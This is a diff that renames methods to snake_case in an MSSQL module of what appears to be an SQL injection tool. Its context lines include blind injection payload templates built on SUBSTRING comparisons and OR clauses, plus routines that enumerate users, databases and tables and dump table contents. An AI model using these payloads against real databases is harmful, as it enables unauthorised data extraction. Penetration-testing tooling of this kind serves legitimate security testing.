@@ -42,7 +42,7 @@ class MSSQLServerMap(Common):
 
         return expression
 
-    def createStm(self):
+    def create_stm(self):
         if self.args.injectionMethod == "numeric":
             evilStm = " OR ASCII(SUBSTRING((%s), %d, %d)) > %d"
         elif self.args.injectionMethod == "stringsingle":
@@ -52,7 +52,7 @@ class MSSQLServerMap(Common):
 
         return evilStm
 
-    def createExactStm(self):
+    def create_exact_stm(self):
         if self.args.injectionMethod == "numeric":
             evilStm = " OR SUBSTRING((%s), %d, %d) = '%s' AND 1=1"
         elif self.args.injectionMethod == "stringsingle":
@@ -62,11 +62,11 @@ class MSSQLServerMap(Common):
 
         return evilStm
 
-    def getFingerprint(self):
+    def get_fingerprint(self):
         if not self.args.exaustiveFp:
             return "Microsoft SQL Server"
 
-        actVer = self.parseFp("Microsoft SQL Server", self.__fingerprint)
+        actVer = self.parse_fp("Microsoft SQL Server", self.__fingerprint)
         value = "active fingerprint: %s" % actVer
 
         if self.__banner:
@@ -76,14 +76,14 @@ class MSSQLServerMap(Common):
                 release = "Microsoft SQL Server %s, version" % banVer.groups(
                 )[0]
                 banVer = banVer.groups()[1]
-                banVer = self.parseFp(release, [banVer])
+                banVer = self.parse_fp(release, [banVer])
 
             blank = " " * 16
             value += "\n%sbanner parsing fingerprint: %s" % (blank, banVer)
 
         return value
 
-    def getBanner(self):
+    def get_banner(self):
         logMsg = "fetching banner"
         self.log(logMsg)
 
@@ -92,13 +92,13 @@ class MSSQLServerMap(Common):
 
         return self.__banner
 
-    def getCurrentUser(self):
+    def get_current_user(self):
         logMsg = "fetching current user"
         self.log(logMsg)
 
         return self.get_value("USER_NAME()")
 
-    def getCurrentDb(self):
+    def get_current_db(self):
         logMsg = "fetching current database"
         self.log(logMsg)
 
@@ -107,7 +107,7 @@ class MSSQLServerMap(Common):
         else:
             return self.get_value("DB_NAME()")
 
-    def getUsers(self):
+    def get_users(self):
         logMsg = "fetching number of database users"
         self.log(logMsg)
 
@@ -138,7 +138,7 @@ class MSSQLServerMap(Common):
 
         return users
 
-    def getDbs(self):
+    def get_dbs(self):
         logMsg = "fetching number of databases"
         self.log(logMsg)
 
@@ -172,10 +172,10 @@ class MSSQLServerMap(Common):
 
         return dbs
 
-    def getTables(self):
+    def get_tables(self):
         if not self.args.db:
             if not len(self.__cachedDbs):
-                dbs = self.getDbs()
+                dbs = self.get_dbs()
             else:
                 dbs = self.__cachedDbs
         else:
@@ -184,7 +184,7 @@ class MSSQLServerMap(Common):
             else:
                 dbs = [self.args.db]
 
-        dbTables = {}
+        db_tables = {}
 
         for db in dbs:
             logMsg = "fetching number of tables for database '%s'" % db
@@ -221,21 +221,21 @@ class MSSQLServerMap(Common):
                 tables.append(table)
 
             if tables:
-                dbTables[db] = tables
+                db_tables[db] = tables
             else:
                 warnMsg = "unable to retrieve the tables "
                 warnMsg += "for database '%s'" % db
                 self.warn(warnMsg)
 
-        if dbTables:
-            self.__cachedTables = dbTables
+        if db_tables:
+            self.__cachedTables = db_tables
         elif not self.args.db:
             errMsg = "unable to retrieve the tables for any database"
             raise Exception(errMsg)
 
-        return dbTables
+        return db_tables
 
-    def getColumns(self):
+    def get_columns(self):
         if not self.args.tbl:
             errMsg = "missing table parameter"
             raise Exception(errMsg)
@@ -324,7 +324,7 @@ class MSSQLServerMap(Common):
 
         return tableColumns
 
-    def dumpTable(self):
+    def dump_table(self):
         if not self.args.tbl:
             errMsg = "missing table parameter"
             raise Exception(errMsg)
@@ -339,7 +339,7 @@ class MSSQLServerMap(Common):
             raise Exception(errMsg)
 
         if not self.__cachedColumns:
-            self.__cachedColumns = self.getColumns()
+            self.__cachedColumns = self.get_columns()
 
         logMsg = "fetching number of entries for table "
         logMsg += "'%s' on database '%s'" % (self.args.tbl, self.args.db)
@@ -412,18 +412,18 @@ class MSSQLServerMap(Common):
 
         return columnValues
 
-    def getFile(self, filename):
+    def get_file(self, filename):
         errMsg = "Microsoft SQL Server module does "
         errMsg += "not support file reading"
         raise Exception(errMsg)
 
-    def getExpr(self, expression):
-        if self.args.unionUse:
-            return self.unionUse(expression)
+    def get_expr(self, expression):
+        if self.args.union_use:
+            return self.union_use(expression)
         else:
             return self.get_value(expression)
 
-    def checkDbms(self):
+    def check_dbms(self):
         logMsg = "testing Microsoft SQL Server"
         self.log(logMsg)
 
@@ -436,7 +436,7 @@ class MSSQLServerMap(Common):
 
             self.__fingerprint = []
 
-            if self.args.getBanner:
+            if self.args.get_banner:
                 self.__banner = self.get_value("@@VERSION")
 
             return True
